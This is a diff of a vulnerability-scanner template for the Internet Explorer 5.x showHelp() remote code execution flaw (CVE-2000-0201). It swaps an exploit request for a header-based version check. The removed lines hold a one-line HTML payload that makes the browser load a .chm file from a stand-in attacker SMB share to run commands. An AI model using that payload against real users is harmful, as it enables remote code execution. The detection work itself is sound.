@@ -1,10 +1,10 @@
 [info]
-author = "AVE"
-description = "Internet Explorer 5.x window.showHelp() 远程代码执行漏洞验证，通过构造恶意网页调用 showHelp 加载远程 SMB 共享中的 .chm 文件执行任意命令"
+author = "ave"
+description = "通过构造特制 HTTP 页面触发 IE 5.x 的 window.showHelp() 方法加载远程 .chm 文件，验证是否存在安全限制绕过漏洞。仅检测漏洞存在性，不执行恶意载荷。"
 id = "POC-AVE-2000-0178"
-name = "CVE-2000-0201 PoC"
+name = "Internet Explorer 5.x HTML Help Remote Code Execution PoC"
 severity = "medium"
-tags = ["cve-2000-0201"]
+tags = ["ave-2000-0178"]
 vuln_id = [
     "CVE-2000-0201",
     "AVE-2000-0178",
@@ -15,15 +15,14 @@ logic = "all"
 
 [[poc.requests]]
 method = "GET"
-path = "/{{BaseURL}}/poc.html"
+path = "/{{BaseURL}}/"
 protocol = "http"
-
-[poc.requests.body]
-content = "<html><body><script>window.showHelp('file://///attacker/share/exploit.chm');</script></body></html>"
-type = "raw"
 
 [[poc.requests.matchers]]
 expect = true
-part = "body"
+part = "header"
 type = "word"
-words = ["showHelp"]
+words = [
+    "MSIE 5.",
+    "Internet Explorer 5",
+]
